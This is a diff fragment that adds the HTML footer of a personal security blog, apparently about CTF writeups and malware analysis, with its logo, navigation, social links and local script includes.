+        <div class="footer-brand"><svg style="width:22px;height:23px;flex-shrink:0;display:block;" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg"><path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/><path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/></svg><span class="footer-brand-text">Ziro<em>v</em></span></div>
+        <p class="footer-tagline">CTF writeups · malware analysis<br>offensive research · built for the curious mind.</p>
+        <a href="https://buymeacoffee.com/zirov" target="_blank" rel="noopener noreferrer" class="footer-coffee">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>
+          <div class="footer-coffee-text"><span class="footer-coffee-label">Support the work</span><span class="footer-coffee-sub">Buy me a coffee</span></div>
+          <svg class="footer-coffee-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+        </a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-label">Explore</div>
+        <nav class="footer-links">
+          <a href="/#writeups"  class="footer-link"><span class="footer-link-arr">›</span>Writeups</a>
+          <a href="/#research"  class="footer-link"><span class="footer-link-arr">›</span>Research</a>
+          <a href="/#scripting" class="footer-link"><span class="footer-link-arr">›</span>Scripting</a>
+          <a href="/#notes"     class="footer-link"><span class="footer-link-arr">›</span>Notes</a>
+        </nav>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-label">Connect</div>
+        <div class="footer-socials">
+          <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="footer-soc"><svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg> GitHub</a>
+          <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="footer-soc"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg> LinkedIn</a>
+          <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="footer-soc"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg> HackTheBox</a>
+          <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener" class="footer-soc"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg> Discord</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bar">
+      <span class="footer-copy">© 2026 <em>Zirov</em> · All rights reserved.</span>
+      <div class="footer-bar-links"><a href="#" class="footer-bar-link">Privacy</a><a href="#" class="footer-bar-link">RSS</a></div>
+    </div>
+  </footer>
+  <script src="/js/app.js"></script>
+  <script src="/js/post.js"></script>
+  <script src="/js/search.js"></script>
+  <script src="/js/analytics.js"></script>
+</body>
+</html>
